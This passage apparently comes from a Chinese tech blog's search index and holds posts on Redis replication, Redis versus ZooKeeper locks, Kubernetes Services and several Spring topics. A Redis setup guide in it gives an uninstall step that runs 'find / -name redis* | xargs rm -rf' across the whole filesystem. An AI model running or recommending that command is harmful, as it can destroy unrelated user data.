一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：\n（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。\n（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。\n（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-\u0026gt;复制缓冲区溢出导致复制中断-\u0026gt;重连-\u0026gt;全量复制-\u0026gt;复制缓冲区溢出导致复制中断……的循环。\n（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-\u0026gt;超时导致复制中断-\u0026gt;重连-\u0026gt;全量复制-\u0026gt;超时导致复制中断……的循环。\n此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。\n6.7 info Replication 在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。\n主节点：\n从节点：\n对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。\ninfo Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。\n7. 总结 下面回顾一下本文的主要内容：\n 主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。 主从复制的操作：即slaveof命令。 主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。 应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。  主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。\n参考 深入学习Redis（3）：主从复制 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/","series":["Manual"],"tags":["Redis"],"title":"Redis主从复制"},{"categories":["编程思想"],"content":" redis 分布式锁，其实需要自己不断去尝试获取锁，比较消耗性能。 zk 分布式锁，获取不到锁，注册个监听器即可，不需要不断主动尝试获取锁，性能开销较小。  另外一点就是，如果是 Redis 获取锁的那个客户端 出现 bug 挂了，那么只能等待超时时间之后才能释放锁；而 zk 的话，因为创建的是临时 znode，只要客户端挂了，znode 就没了，此时就自动释放锁。\nRedis 分布式锁大家没发现好麻烦吗？遍历上锁，计算时间等等\u0026hellip;\u0026hellip;zk 的分布式锁语义清晰实现简单。\n所以先不分析太多的东西，就说这两点，我个人实践认为 zk 的分布式锁比 Redis 的分布式锁牢靠、而且模型简单易用。\n参考 一般实现分布式锁都有哪些方式？使用 Redis 如何设计分布式锁？使用 zk 来设计分布式锁可以吗？这两种分布式锁的实现方式哪种效率比较高？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%92%8Czk%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84%E5%AF%B9%E6%AF%94/","series":["Manual"],"tags":["ZK","Redis"],"title":"redis分布式锁和zk分布式锁的对比"},{"categories":["编程思想"],"content":"1. 安装 $ wget http://download.redis.io/releases/redis-5.0.8.tar.gz $ tar xzf redis-5.0.8.tar.gz $ cd redis-5.0.8 $ make 2.配置  注释掉bind 127.0.0.1 protected-mode yes requirepass xxxpassword daemonize yes  3. 启动 cd src ./redis-server 或者\ncd src ./redis-server ../redis.conf 4. 停止 cd src ./redis-cli auth xxxpassword shutdown exit 5. 卸载 find / -name \u0026#34;redis*\u0026#34; | xargs rm -rf 6.远程连接 window连接远程redis:\nredis-cli -h 193.112.37.xxx -p 6379 -a xxxpassword ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/redis%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/","series":["Manual"],"tags":["Redis"],"title":"Redis配置指南"},{"categories":["云原生"],"content":"Overview（概述） Kubernetes Pod是平凡的，它门会被创建，也会死掉（生老病死），并且他们是不可复活的。 ReplicationControllers动态的创建和销毁Pods(比如规模扩大或者缩小，或者执行动态更新)。每个pod都由自己的ip，这些IP也随着时间的变化也不能持续依赖。这样就引发了一个问题：如果一些Pods（让我们叫它作后台，后端）提供了一些功能供其它的Pod使用（让我们叫作前台），在kubernete集群中是如何实现让这些前台能够持续的追踪到这些后台的？\n答案是：Service\nKubernete Service 是一个定义了一组Pod 的策略的抽象，我们也有时候叫做宏观服务。这些被服务标记的Pod都是（一般）通过label Selector决定的（下面我们会讲到我们为什么需要一个没有label selector的服务）\n举个例子，我们假设后台是一个图形处理的后台，并且由3个副本。这些副本是可以相互替代的，并且前台并需要关心使用的哪一个后台Pod，当这个承载前台请求的pod发生变化时，前台并不需要直到这些变化，或者追踪后台的这些副本，服务是这些去耦\n对于Kubernete原生的应用，Kubernete提供了一个简单的Endpoints API，这个Endpoints api的作用就是当一个服务中的pod发生变化时，Endpoints API随之变化，对于哪些不是原生的程序，Kubernetes提供了一个基于虚拟IP的网桥的服务，这个服务会将请求转发到对应的后台pod\nDefining a service(定义一个服务) 一个Kubernete服务是一个最小的对象，类似pod,和其它的终端对象一样，我们可以朝paiserver发送请求来创建一个新的实例，比如，假设你拥有一些Pod,每个pod都开放了9376端口，并且均带有一个标签app=MyApp\n{ \u0026#34;“kind”\u0026#34;: \u0026#34;“Service”\u0026#34;, \u0026#34;“apiVersion”\u0026#34;: \u0026#34;“v1”\u0026#34;, \u0026#34;“metadata”\u0026#34;: { \u0026#34;“name”\u0026#34;: \u0026#34;“my-service”\u0026#34; }, \u0026#34;“spec”\u0026#34;: { \u0026#34;“selector”\u0026#34;: { \u0026#34;“app”\u0026#34;: \u0026#34;“MyApp”\u0026#34; }, \u0026#34;“ports”\u0026#34;: [ { \u0026#34;“protocol”\u0026#34;: \u0026#34;“TCP”\u0026#34;, \u0026#34;“port”\u0026#34;: 80, \u0026#34;“targetPort”\u0026#34;: 9376 } ] } } 这段代码会创建一个新的服务对象，名称为：my-service，并且会连接目标端口9376，并且带有label app=MyApp的pod,这个服务会被分配一个ip地址，这个ip是给服务代理使用的（下面我们会看到），服务的选择器会持续的评估，并且结果会被发送到一个Endpoints 对象，这个Endpoints的对象的名字也叫“my-service”.\n服务可以将一个“入端口”转发到任何“目标端口”，默认情况下targetPort的值会和port的值相同，更有趣的是，targetPort可以是字符串，可以指定到一个name,这个name是pod的一个端口。并且实际指派给这个name的端口可以是不同在不同的后台pod中，这样让我们能更加灵活的部署我们的服务，比如；我们可以在下一个更新版本中修改后台pod暴露的端口而不会影响客户的使用（更新过程不会打断）\n 服务支持tcp和UDP，但是默认的是TCP Services without selectors（没有选择器的服务）  服务总体上抽象了对Pod的访问，但是服务也抽象了其它的内容，比如：\n1：比如你希望有一个额外的数据库云在生产环境中，但是在测试的时候，我们希望使用自己的数据库\n2：我们希望将服务指向其它的服务或者其它命名空间或者其它的云平台上的服务\n3：我们正在向kubernete迁移，并且我们后台并没有在Kubernete中\n如上的情况下，我们可以定义一个服务没有选择器\n{ \u0026#34;“kind”\u0026#34;: \u0026#34;“Service”\u0026#34;, \u0026#34;“apiVersion”\u0026#34;: \u0026#34;“v1″\u0026#34;, \u0026#34;“metadata”\u0026#34;: { \u0026#34;“name”\u0026#34;: \u0026#34;“my-service”\u0026#34; }, \u0026#34;“spec”\u0026#34;: { \u0026#34;“ports”\u0026#34;: [ { \u0026#34;“protocol”\u0026#34;: \u0026#34;“TCP”\u0026#34;, \u0026#34;“port”\u0026#34;: 80, \u0026#34;“targetPort”\u0026#34;: 9376 } ] } } 因为没有选择器，所以相应的Endpoints对象就不会被创建，但是我们手动把我们的服务和Endpoints对应起来\n{ \u0026#34;“kind”\u0026#34;: \u0026#34;“Endpoints”\u0026#34;, \u0026#34;“apiVersion”\u0026#34;: \u0026#34;“v1″\u0026#34;, \u0026#34;“metadata”\u0026#34;: { \u0026#34;“name”\u0026#34;: \u0026#34;“my-service”\u0026#34; }, \u0026#34;“subsets”\u0026#34;: [ { \u0026#34;“addresses”\u0026#34;: [ { \u0026#34;“IP”\u0026#34;: \u0026#34;“1.2.3.4”\u0026#34; } ], \u0026#34;“ports”\u0026#34;: [ { \u0026#34;“port”\u0026#34;: 80 } ] } ] } 这样的话，这个服务虽然没有selector，但是却可以正常工作，所有的请求都会被转发到1.2.3.4:80\nVirtual IPs and service proxies（虚拟IP和服务代理） 每一个节点上都运行了一个kube-proxy，这个应用监控着Kubermaster增加和删除服务，对于每一个服务，kube-proxy会随机开启一个本机端口，任何发向这个端口的请求都会被转发到一个后台的Pod当中，而如何选择是哪一个后台的pod的是基于SessionAffinity进行的分配。kube-proxy会增加iptables rules来实现捕捉这个服务的Ip和端口来并重定向到前面提到的端口。\n最终的结果就是所有的对于这个服务的请求都会被转发到后台的Pod中，这一过程用户根本察觉不到\n默认的，后台的选择是随机的，基于用户session机制的策略可以通过修改service.spec.sessionAffinity 的值从NONE到ClientIP\nMulti-Port Services（多端口服务） 可能很多服务需要开发不止一个端口,为了满足这样的情况，Kubernetes允许在定义时候指定多个端口，当我们使用多个端口的时候，我们需要指定所有端口的名称，这样endpoints才能清楚，例如\n{ \u0026#34;“kind”\u0026#34;: \u0026#34;“Service”\u0026#34;, \u0026#34;“apiVersion”\u0026#34;: \u0026#34;“v1”\u0026#34;, \u0026#34;“metadata”\u0026#34;: { \u0026#34;“name”\u0026#34;: \u0026#34;“my-service”\u0026#34; }, \u0026#34;“spec”\u0026#34;: { \u0026#34;“selector”\u0026#34;: { \u0026#34;“app”\u0026#34;: \u0026#34;“MyApp”\u0026#34; }, \u0026#34;“ports”\u0026#34;: [ { \u0026#34;“name”\u0026#34;: \u0026#34;“http”\u0026#34;, \u0026#34;“protocol”\u0026#34;: \u0026#34;“TCP”\u0026#34;, \u0026#34;“port”\u0026#34;: 80, \u0026#34;“targetPort”\u0026#34;: 9376 }, { \u0026#34;“name”\u0026#34;: \u0026#34;“https”\u0026#34;, \u0026#34;“protocol”\u0026#34;: \u0026#34;“TCP”\u0026#34;, \u0026#34;“port”\u0026#34;: 443, \u0026#34;“targetPort”\u0026#34;: 9377 } ] } } 选择自己的IP地址 我们可以在创建服务的时候指定IP地址，将spec.clusterIP的值设定为我们想要的IP地址即可。例如，我们已经有一个DNS域我们希望用来替换，或者遗留系统只能对指定IP提供服务，并且这些都非常难修改，用户选择的IP地址必须是一个有效的IP地址，并且要在API server分配的IP范围内，如果这个IP地址是不可用的，apiserver会返回422http错误代码来告知是IP地址不可用\n为什么不使用循环的DNS 一个问题持续的被提出来，这个问题就是我们为什么不使用标准的循环DNS而使用虚拟IP，我们主要有如下几个原因\n1：DNS不遵循TTL查询和缓存name查询的问题由来已久（这个还真不知道，就是DNS更新的问题估计）\n2：许多的应用的DNS查询查询一次后就缓存起来\n3：即使如上亮点被解决了，但是不停的进行DNS进行查询，大量的请求也是很难被管理的\n我们希望阻止用户使用这些可能会“伤害”他们的事情，但是如果足够多的人要求这么作，那么我们将对此提供支持，来作为一个可选项.\nDiscovering services（服务的发现） Kubernetes 支持两种方式的来发现服务 ，环境变量和 DNS\n环境变量 当一个Pod在一个node上运行时，kubelet 会针对运行的服务增加一系列的环境变量，它支持Docker links compatible 和普通环境变量\n举例子来说：\nredis-master服务暴露了 TCP 6379端口，并且被分配了10.0.0.11 IP地址\n那么我们就会有如下的环境变量\n REDIS_MASTER_SERVICE_HOST=10.0.0.11\nREDIS_MASTER_SERVICE_PORT=6379\nREDIS_MASTER_PORT=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP_PROTO=tcp\nREDIS_MASTER_PORT_6379_TCP_PORT=6379\nREDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11\n 这样的话，对系统有一个要求：所有的想要被POD访问的服务，必须在POD创建之前创建，否则这个环境变量不会被填充，使用DNS则没有这个问题\nDNS 一个可选择的云平台插件就是DNS，DNS 服务器监控着API SERVER ，当有服务被创建的时候，DNS 服务器会为之创建相应的记录，如果DNS这个服务被添加了，那么Pod应该是可以自动解析服务的。\n举个例子来说：如果我们在my-ns命名空间下有一个服务叫做“my-service”，这个时候DNS就会创建一个my-service.my-ns的记录，所有my-ns命名空间下的Pod,都可以通过域名my-service查询找到对应的ip地址，不同命名空间下的Pod在查找是必须使用my-sesrvice.my-ns才可以。\nKubernete 同样支持端口的解析，如果my-service有一个提供http的TCP主持的端口，那么我们可以通过查询“_http._tcp.my-service.my-ns”来查询这个端口\nHeadless services 有时候我们可能不需要一个固定的IP和分发，这个时候我们只需要将spec.clusterIP的值设置为none就可以了\n对于这样的服务来说，集群IP没有分配，这个时候当你查询服务的名称的时候，DNS会返回多个A记录，这些记录都是指向后端Pod的。Kube 代理不会处理这个服务，在服务的前端也没有负载均衡器。但是endpoints controller还是会创建Endpoints\n（好吧，这个好处貌似我还理解好）\nThis option allows developers to reduce coupling to the Kubernetes system, if they desire, but leaves them freedom to do discovery in their own way. Applications can still use a self-registration pattern and adapters for other discovery systems could easily be built upon this API.\nExternal services（外部服务） 对于我们的应用程序来说，我们可能有一部分是放在Kubernete外部的（比如我们有单独的物理机来承担数据库的角色），Kubernetes支持两种方式：NodePorts，LoadBalancers\n每一个服务都会有一个字段定义了该服务如何被调用（发现），这个字段的值可以为：\n ClusterIP:使用一个集群固定IP，这个是默认选项 NodePort：使用一个集群固定IP，但是额外在每个POD上均暴露这个服务，端口 LoadBalancer：使用集群固定IP，和NODEPord,额外还会申请申请一个负载均衡器来转发到服务（load balancer ）  注意：NodePort 支持TCP和UDN，但是LoadBalancers在1.0版本只支持TCP\nType NodePort 如果你选择了“NodePort”，那么 Kubernetes master 会分配一个区域范围内，（默认是30000-32767），并且，每一个node，都会代理（proxy）这个端口到你的服务中，我们可以在spec.ports[*].nodePort 找到具体的值\n如果我们向指定一个端口，我们可以直接写在nodePort上，系统就会给你指派指定端口，但是这个值必须是指定范围内的。\n这样的话就能够让开发者搭配自己的负载均衡器，去撘建一个kubernete不是完全支持的系统，又或者是直接暴露一个node的ip地址\nType LoadBalancer 在支持额外的负载均衡器的的平台上，将值设置为LoadBalancer会提供一个负载均衡器给你的服务，负载均衡器的创建其实是异步的。下面的例子\n{ \u0026#34;“kind”\u0026#34;: \u0026#34;“Service”\u0026#34;, \u0026#34;“apiVersion”\u0026#34;: \u0026#34;“v1″\u0026#34;, \u0026#34;“metadata”\u0026#34;: { \u0026#34;“name”\u0026#34;: \u0026#34;“my-service”\u0026#34; }, \u0026#34;“spec”\u0026#34;: { \u0026#34;“selector”\u0026#34;: { \u0026#34;“app”\u0026#34;: \u0026#34;“MyApp”\u0026#34; }, \u0026#34;“ports”\u0026#34;: [ { \u0026#34;“protocol”\u0026#34;: \u0026#34;“TCP”\u0026#34;, \u0026#34;“port”\u0026#34;: 80, \u0026#34;“targetPort”\u0026#34;: 9376, \u0026#34;“nodePort”\u0026#34;: 30061 } ], \u0026#34;“clusterIP”\u0026#34;: \u0026#34;“10.0.171.239”\u0026#34;, \u0026#34;“type”\u0026#34;: \u0026#34;“LoadBalancer”\u0026#34; }, \u0026#34;“status”\u0026#34;: { \u0026#34;“loadBalancer”\u0026#34;: { \u0026#34;“ingress”\u0026#34;: [ { \u0026#34;“ip”\u0026#34;: \u0026#34;“146.148.47.155”\u0026#34; } ] } } } 所有服务的请求均会直接到到Pod,具体是如何工作的是由平台决定的\n缺点\n我们希望使用IPTABLES和用户命名空间来代理虚拟IP能在中小型规模的平台上正常运行，但是可能出现问题在比较大的平台上当应对成千上万的服务的时候。\n这个时候，使用kube-proxy来封装服务的请求，这使得这些变成可能\nLoadBalancers 只支持TCP，不支持UDP\nType 的值是设定好的，不同的值代表不同的功能，并不是所有的平台都需要的，但是是所有API需要的\nFuture work 在将来，我们预想proxy的策略能够更加细致，不再是单纯的转发，比如master-elected or sharded，我们预想将来服务会拥有真正的负载均衡器，到时候虚拟IP直接转发到负载均衡器\n将来有倾向与将所的工作均通过iptables来进行，从而小从用户命名空间代理，这样的话会有更好的性能和消除一些原地值IP的问题，尽管这样的会减少一些灵活性.\n参考链接\nhttps://www.kubernetes.org.cn/ http://docs.kubernetes.org.cn/ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E8%B5%84%E6%BA%90%E5%AF%B9%E8%B1%A1/services/","series":["k8s"],"tags":["云原生","k8s"],"title":"Services"},{"categories":["编程思想"],"content":"当我第一次登录时我会得到{\u0026quot; timestamp\u0026quot;：1481719982036，\u0026quot; status\u0026quot;：999，\u0026quot; error\u0026quot;：\u0026quot; None\u0026quot;，\u0026quot; message\u0026quot;：\u0026quot;无可用消息\u0026quot;}，但第二次还可以。\n解决办法：填写如下配置到application.properties\nspring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration 参考链接：java:Spring Security第一次登录失败，第二次登录成功 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/exception/spring-security%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E7%AC%AC%E4%BA%8C%E6%AC%A1%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F/","series":["Manual"],"tags":["spring"],"title":"Spring Security第一次登录失败，第二次登录成功"},{"categories":["编程思想"],"content":"假设一个接口里面有两个方法：\npackage demo.long; public interface CustomerService { public void doSomething1(); public void doSomething2(); } 接口实现类如下：\npackage demo.long.impl; import demo.long.CustomerService; public class CustomerServiceImpl implements CustomerService { public void doSomething1() { System.out.println(\u0026#34;CustomerServiceImpl.doSomething1()\u0026#34;); doSomething2(); } public void doSomething2() { System.out.println(\u0026#34;CustomerServiceImpl.doSomething2()\u0026#34;); } } 现在我需要在CustomerService接口的每个方法被调用时都在方法前执行一些逻辑，所以需要配置一个拦截器：\npackage demo.long; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; @Aspect public class CustomerServiceInterceptor { @Before(\u0026#34;execution(* demo.long..*.*(..))\u0026#34;) public void doBefore() { System.out.println(\u0026#34;do some important things before...\u0026#34;); } } 把Bean加到Spring配置中\n\u0026lt;aop:aspectj-autoproxy /\u0026gt; \u0026lt;bean id=\u0026#34;customerService\u0026#34; class=\u0026#34;demo.long.impl.CustomerServiceImpl\u0026#34; /\u0026gt; \u0026lt;bean id=\u0026#34;customerServiceInterceptor\u0026#34; class=\u0026#34;demo.long.CustomerServiceInterceptor\u0026#34; /\u0026gt; 如果现在外部对象调用CustomerService的doSomething1()方法的时候，会发现只有doSomething1()方法执行前打印了“do some important things before\u0026hellip;”，而doSomething1()内部调用doSomething2()时并没有打印上述内容；外部对象单独调用doSomething2()时会打印上述内容。\npublic class CustomerServiceTest { @Autowired ICustomerService customerService; @Test public void testAOP() { customerService.doSomething1(); } } 原因分析 拦截器的实现原理就是动态代理，实现AOP机制。Spring 的代理实现有两种：一是基于 JDK Dynamic Proxy 技术而实现的；二是基于 CGLIB 技术而实现的。如果目标对象实现了接口，在默认情况下Spring会采用JDK的动态代理实现AOP，CustomerServerImpl正是这种情况。\nJDK动态代理生成的CustomerServiceImpl的代理类大致如下：\npublic class CustomerServiceProxy implements CustomerService { private CustomerService customerService; public void setCustomerService(CustomerService customerService) { this.customerService = customerService; } public void doSomething1() { doBefore(); customerService.doSomething1(); } public void doSomething2() { doBefore(); customerService.doSomething2(); } private void doBefore() { // 例如，可以在此处开启事务或记录日志  System.out.println(\u0026#34;do some important things before...\u0026#34;); } } 客户端程序使用代理类对象去调用业务逻辑：\npublic class TestProxy { public static void main(String[] args) { // 创建代理目标对象  // 对于Spring来说，这一工作是由Spring容器完成的。  CustomerService serviceProxyTarget = new CustomerServiceImpl(); // 创建代理对象  // 对于Spring来说，这一工作也是由Spring容器完成的。  CustomerServiceProxy serviceProxy = new CustomerServiceProxy(); serviceProxy.setCustomerService(serviceProxyTarget); CustomerService serviceBean = (CustomerService) serviceProxy; // 调用业务逻辑操作  serviceBean.doSomething1(); } } 执行main方法，发现doSomething1()中调用doSomething2()方法的时候并未去执行CustomerServiceProxy类的doBefore()方法。其实doSomething2()等同于this.doSomething2()，在CustomerServiceImpl类中this关键字表示的是当前这个CustomerServiceImpl类的实例，所以程序会去执行CustomerServiceImpl对象中的doSomething2()方法，而不会去执行CustomerServiceProxy类对象中的 doSomething2()方法。\n在使用Spring AOP的时候，我们从IOC容器中获取的Bean对象其实都是代理对象，而不是那些Bean对象本身，由于this关键字引用的并不是该Service Bean对象的代理对象，而是其本身，因此Spring AOP是不能拦截到这些被嵌套调用的方法的。\n解决方案  修改类，不要出现“自调用”的情况：这是Spring文档中推荐的“最佳”方案； 若一定要使用“自调用”，那么this.doSomething2()替换为：((CustomerService) AopContext.currentProxy()).doSomething2()；此时需要修改spring的aop配置：  xml:\n\u0026lt;aop:aspectj-autoproxy expose-proxy=\u0026#34;true\u0026#34; /\u0026gt; 注解：\n@EnableAspectJAutoProxy(exposeProxy = true) 参考链接： https://www.jianshu.com/p/6534945eb3b5 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/springaop%E6%96%B9%E6%B3%95%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E4%B8%8D%E7%94%9F%E6%95%88/","series":["Manual"],"tags":["Spring"],"title":"SpringAOP方法内部调用不生效"},{"categories":["编程思想"],"content":"使用SpringBoot Admin 配置QQ邮箱去发送邮件时报错：com.sun.mail.smtp.SMTPSenderFailedException: 501 mail from address must be same as authorization user，我的配置如下：\nspring.mail.host: smtp.qq.com spring.mail.username: 发送账号 spring.mail.password: qq授权码 spring.boot.admin.notify.mail.to: 接收账号 后来在网上查到是少了spring.boot.admin.notify.mail.from的配置，貌似只有QQ邮箱才需要额外加上这个设置（本人没有测试过用其他邮箱发送邮件）。所以最终配置如下：\nspring.mail.host: smtp.qq.com spring.mail.username: 发送账号 spring.mail.password: qq授权码 spring.boot.admin.notify.mail.to: 接收账号 spring.boot.admin.notify.mail.from: 发送账号 参考： Springboot admin 发送邮件失败：com.sun.mail.smtp.SMTPSenderFailedException: 553 Mail from must equal authorized user ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/springboot/springboot%E4%BD%BF%E7%94%A8qq%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E9%85%8D%E7%BD%AE/","series":["Manual"],"tags":["SpringBoot"],"title":"SpringBoot使用QQ邮箱发送邮件配置"},{"categories":["编程思想"],"content":"SpringMVC执行流程  用户发送请求至前端控制器DispatcherServlet DispatcherServlet收到请求调用处理器映射器HandlerMapping。 处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet。 DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作 执行处理器Handler(Controller，也叫页面控制器)。 Handler执行完成返回ModelAndView HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet DispatcherServlet将ModelAndView传给ViewReslover视图解析器 ViewReslover解析后返回具体View DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）。 DispatcherServlet响应用户。  组件说明  DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现 HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现 Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。 HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。 ModelAndView是springmvc的封装对象，将model和view封装在一起。 ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户。 View: 是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。  参考链接： SpringMVC执行流程及工作原理 Spring MVC【入门】就这一篇！ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/springmvc/","series":["Manual"],"tags":["Spring"],"title":"SpringMVC"},{"categories":["编程思想"],"content":"Spring事务可简单的理解为由PlatformTransactionManager, TransactionDefinition, TransactionStatus 构成\nPlatformTransactionManager 其中 org.springframework.transaction.PlatformTransactionManager 接口定义如下：\npublic interface PlatformTransactionManager extends TransactionManager { // Return a currently active transaction or create a new one, according to the specified propagation behavior（根据指定的传播行为，返回当前活动的事务或创建一个新事务。）  TransactionStatus getTransaction(TransactionDefinition definition) throws TransactionException; // Commit the given transaction, with regard to its status（使用事务目前的状态提交事务）  Void commit(TransactionStatus status) throws TransactionException; // Perform a rollback of the given transaction（对执行的事务进行回滚）  Void rollback(TransactionStatus status) throws TransactionException; } Spring并不直接管理事务，它只提供接口抽象，事务管理器的具体实现由持久化框架自己实现，例如：DataSourceTransactionManager (JDBC / MyBatis),\nJpaTransactionManager, HibernateTransactionManager, JtaTransactionManager, KafkaTransactionManager, RedissonTransactionManager\nTransactionDefinition Spring定义了事务管理的五大属性：隔离级别、传播行为、是否只读、事务超时、回滚规则\n除回滚规则之外，其他属性都可以通过TransactionDefinition接口获得。\n其中org.springframework.transaction.TransactionDefinition 接口定义如下：\npublic interface TransactionDefinition { // 返回事务的传播行为  int getPropagationBehavior(); // 返回事务的隔离级别，事务管理器根据它来控制另外一个事务可以看到本事务内的哪些数据  int getIsolationLevel(); //返回事务的名字  String getName()； // 返回事务必须在多少秒内完成  int getTimeout(); // 返回是否优化为只读事务。  boolean isReadOnly(); } TransactionStatus 只有hasSavepoint方法不是继承的。\n其中 org.springframework.transaction.TransactionStatus 接口定义如下：\npublic interface TransactionStatus extends TransactionExecution, SavepointManager, Flushable { boolean isNewTransaction(); // 是否是新的事物  boolean hasSavepoint(); // 是否有恢复点  void setRollbackOnly(); // 设置为只回滚  boolean isRollbackOnly(); // 是否为只回滚  boolean isCompleted; // 是否已完成 } 参考 可能是最漂亮的Spring事务管理详解 spring 事务的传播机制看这篇就够了 Spring 事务管理 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/spring%E4%BA%8B%E5%8A%A1/","series":["Manual"],"tags":["Spring"],"title":"Spring事务"},{"categories":["编程思想"],"content":"SpringBoot的WEB异常捕获，如果是WEB项目的话，可以直接处理Controller中的异常。如果不是WEB项目的话，就需要使用AspectJ来做切面。\n1. web项目 package com.test.handler; import lombok.extern.log4j.Log4j2; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.ControllerAdvice; import org.springframework.web.bind.annotation.ExceptionHandler; @ControllerAdvice @Log4j2 public class GlobalExceptionHandler { @ExceptionHandler(value = Exception.class) public String exception(Exception e, Model model){ log.error(\u0026#34;find exception:e={}\u0026#34;,e.getMessage()); model.addAttribute(\u0026#34;mes\u0026#34;,e.getMessage()); return \u0026#34;pages/500\u0026#34;; } } 参考链接：\nSpringBootWEB项目和非Web项目的全局异常捕获 SpringBoot 处理异常的几种常见姿势 使用枚举简单封装一个优雅的 Spring Boot 全局异常处理！ 2. 非web项目 package com.test.syncbackend.handler; import lombok.extern.log4j.Log4j2; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Pointcut; import org.springframework.stereotype.Component; @Component @Aspect @Log4j2 public class GlobalExceptionHandler { @Pointcut(\u0026#34;execution(* 